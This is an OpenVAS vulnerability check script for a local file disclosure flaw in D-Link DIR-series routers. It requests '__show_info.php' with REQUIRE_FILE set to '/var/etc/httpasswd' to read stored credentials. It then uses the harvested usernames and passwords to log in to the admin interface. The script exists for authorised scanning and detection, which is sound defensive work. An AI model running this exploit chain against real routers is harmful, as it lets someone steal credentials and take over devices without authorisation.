###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dlink__show_info.php_64043.nasl 12439 2018-11-20 13:01:33Z cfischer $
#
# Multiple D-Link DIR Series Routers 'model/__show_info.php' Local File Disclosure Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103858");
  script_bugtraq_id(64043);
  script_version("$Revision: 12439 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-11-20 14:01:33 +0100 (Tue, 20 Nov 2018) $");
  script_tag(name:"creation_date", value:"2013-12-16 14:34:55 +0100 (Mon, 16 Dec 2013)");
  script_name("Multiple D-Link DIR Series Routers 'model/__show_info.php' Local File Disclosure Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_dlink_dsl_detect.nasl", "gb_dlink_dap_detect.nasl", "gb_dlink_dir_detect.nasl", "gb_dlink_dwr_detect.nasl");
  script_mandatory_keys("Host/is_dlink_device"); # nb: Experiences in the past have shown that various different devices could be affected
  script_require_ports("Services/www", 80, 8080);

  script_tag(name:"impact", value:"Exploiting this vulnerability would allow an attacker to obtain
  potentially sensitive information from local files on devices running
  the vulnerable application. This may aid in further attacks.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request which tries to read '/var/etc/httpasswd'");

  script_tag(name:"insight", value:"The remote D-Link device fails to adequately validate user supplied input
  to 'REQUIRE_FILE' in '__show_info.php'");

  script_tag(name:"solution", value:"Ask the Vendor for an update.");

  script_tag(name:"summary", value:"Multiple D-Link DIR series routers are prone to a local file-
  disclosure vulnerability because the routers fails to adequately validate user- supplied input.");

  script_tag(name:"affected", value:"DIR-615 / DIR-300 / DIR-600.

  Other devices and models might be affected as well.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

CPE_PREFIX = "cpe:/o:d-link";

include("host_details.inc");
include("http_func.inc");

if(!infos = get_app_port_from_cpe_prefix(cpe:CPE_PREFIX, service:"www", first_cpe_only:TRUE)) exit(0);

port = infos["port"];
CPE = infos["cpe"];

if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);
if(dir == "/") dir = "";

url = dir + '/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd';
req = http_get(item:url, port:port);
buf = http_send_recv(port:port, data:req);

if(buf !~ "^HTTP/1\.[01] 200" || "<center>" >!< buf) exit(99);

creds = eregmatch(pattern:'<center>.*([a-zA-Z0-9]+:[a-zA-Z0-9]+)[^a-zA-Z0-9]*</center>', string:buf);

lines = split(buf);
x = 0;

foreach line (lines) {

  x++;
  if("<center>" >< line) {

    for(i=x; i < max_index(lines); i++) {

      if("</center>" >< lines[i])break;
      user_pass = eregmatch(pattern:"([a-zA-Z0-9]+:[a-zA-Z0-9]+)", string:lines[i]);
      if(!isnull(user_pass[1])) {
        ul[p++] = chomp(user_pass[1]);
        continue;
      }
    }
  }
}

if(max_index(ul) < 1) exit(99);

url2 = dir + '/tools_admin.php';
req = http_get(item:url2, port:port);
buf = http_send_recv(port:port, data:req);

if("LOGIN_USER" >!< buf) exit(0);

foreach p (ul) {

  u = split(p, sep:":", keep:FALSE);

  if(isnull(u[0])) continue;

  user = u[0];
  pass = u[1];

  url2 = dir + '/login.php';
  login_data = 'ACTION_POST=LOGIN&LOGIN_USER=' + user  + '&LOGIN_PASSWD=' + pass;
  req = http_post(item:url2, port:port, data:login_data);
  buf = http_send_recv(port:port, data:req);
  if(buf !~ "^HTTP/1\.[01] 200") continue;

  url2 = dir + '/tools_admin.php';
  req = http_get(item:url2, port:port);
  buf = http_send_recv(port:port, data:req);

  if("OPERATOR PASSWORD" >< buf && "ADMIN PASSWORD" >< buf) {
    url2 = "/logout.php";
    req = http_get(item:url2, port:port);
    http_send_recv(port:port, data:req); # clear ip based auth
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);